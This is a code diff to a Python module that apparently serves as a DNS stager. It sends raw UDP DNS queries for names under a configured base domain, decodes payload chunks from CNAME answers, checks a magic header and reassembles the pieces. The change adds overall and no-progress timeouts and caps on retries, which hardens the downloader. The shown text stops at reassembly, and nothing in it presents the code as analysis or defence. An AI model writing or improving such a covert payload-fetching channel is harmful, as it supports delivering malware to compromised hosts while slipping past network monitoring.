@@ -41,10 +41,19 @@ def _index_label(index):
 
 def _piece_name(label, index):
     return '%s.%s.%s' % (label, _index_label(index), BASE_DOMAIN)
+
 TIMEOUT = 2.0
 PIPELINE_WINDOW = 8
 PIPELINE_RESEND_AFTER = 0.5
 PIPELINE_WAIT = 0.2
+STAGER_TOTAL_TIMEOUT = 600.0
+STAGER_NO_PROGRESS_TIMEOUT = PIPELINE_RESEND_AFTER * PIPELINE_WINDOW * 4
+if STAGER_NO_PROGRESS_TIMEOUT < 5.0:
+    STAGER_NO_PROGRESS_TIMEOUT = 5.0
+elif STAGER_NO_PROGRESS_TIMEOUT > 60.0:
+    STAGER_NO_PROGRESS_TIMEOUT = 60.0
+STAGER_MAX_SENDS_PER_CHUNK = 128
+STAGER_MAX_COUNT_QUERIES = 256
 
 try:
     text_type = unicode
@@ -214,12 +223,24 @@ def _query(name, resolver):
     return cname
 
 
-def _fetch_count(resolver):
+def _fetch_count(resolver, start_time):
+    last_progress = start_time
+    attempts = 0
     while True:
+        now = _now()
+        if now - start_time > STAGER_TOTAL_TIMEOUT:
+            return None
+        if now - last_progress > STAGER_NO_PROGRESS_TIMEOUT:
+            return None
+        if attempts >= STAGER_MAX_COUNT_QUERIES:
+            return None
+        attempts += 1
         name = _count_name(_cache_buster_label())
         cname = _query(name, resolver)
         if cname:
             payload = _decode_cname(cname)
+            if payload is not None:
+                last_progress = _now()
             if payload and len(payload) >= 7:
                 if payload[:2] != b'SF':
                     pass
@@ -232,7 +253,7 @@ def _fetch_count(resolver):
         time.sleep(0.1)
 
 
-def _fetch_chunks(resolver, count):
+def _fetch_chunks(resolver, count, start_time):
     chunks = {}
     if count <= 0:
         return chunks
@@ -241,12 +262,18 @@ def _fetch_chunks(resolver, count):
         window = count
     pending = {}
     pending_ids = {}
+    send_counts = {}
     next_index = 1
+    last_progress = _now()
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setblocking(0)
     try:
         while len(chunks) < count:
             now = _now()
+            if now - start_time > STAGER_TOTAL_TIMEOUT:
+                return None
+            if now - last_progress > STAGER_NO_PROGRESS_TIMEOUT:
+                return None
             while len(pending) < window and next_index <= count:
                 index = next_index
                 next_index += 1
@@ -255,6 +282,10 @@ def _fetch_chunks(resolver, count):
                     dns_id, packet = _build_query(name)
                     if dns_id not in pending_ids:
                         break
+                send_count = send_counts.get(index, 0) + 1
+                if send_count > STAGER_MAX_SENDS_PER_CHUNK:
+                    return None
+                send_counts[index] = send_count
                 try:
                     sock.sendto(packet, (resolver, 53))
                 except (socket.error, OSError):
@@ -271,6 +302,10 @@ def _fetch_chunks(resolver, count):
                 if now - info['last_sent'] < PIPELINE_RESEND_AFTER:
                     continue
                 _, packet = _build_query(info['name'], info['id'])
+                send_count = send_counts.get(index, 0) + 1
+                if send_count > STAGER_MAX_SENDS_PER_CHUNK:
+                    return None
+                send_counts[index] = send_count
                 try:
                     sock.sendto(packet, (resolver, 53))
                 except (socket.error, OSError):
@@ -292,6 +327,9 @@ def _fetch_chunks(resolver, count):
                 index = pending_ids.get(resp_id)
                 if index is None:
                     continue
+                info = pending.get(index)
+                if not info:
+                    continue
                 qname, cname = _parse_cname(data)
                 if not qname:
                     continue
@@ -304,6 +342,7 @@ def _fetch_chunks(resolver, count):
                 if payload is None:
                     continue
                 chunks[index] = payload
+                last_progress = _now()
                 del pending_ids[resp_id]
                 if index in pending:
                     del pending[index]
@@ -316,11 +355,12 @@ def main():
     resolver = _resolver()
     if not resolver:
         return None
-    count = _fetch_count(resolver)
+    start_time = _now()
+    count = _fetch_count(resolver, start_time)
     if not count:
         return None
-    chunks = _fetch_chunks(resolver, count)
-    if len(chunks) != count:
+    chunks = _fetch_chunks(resolver, count, start_time)
+    if not chunks or len(chunks) != count:
         return None
     parts = []
     for index in range(1, count + 1):
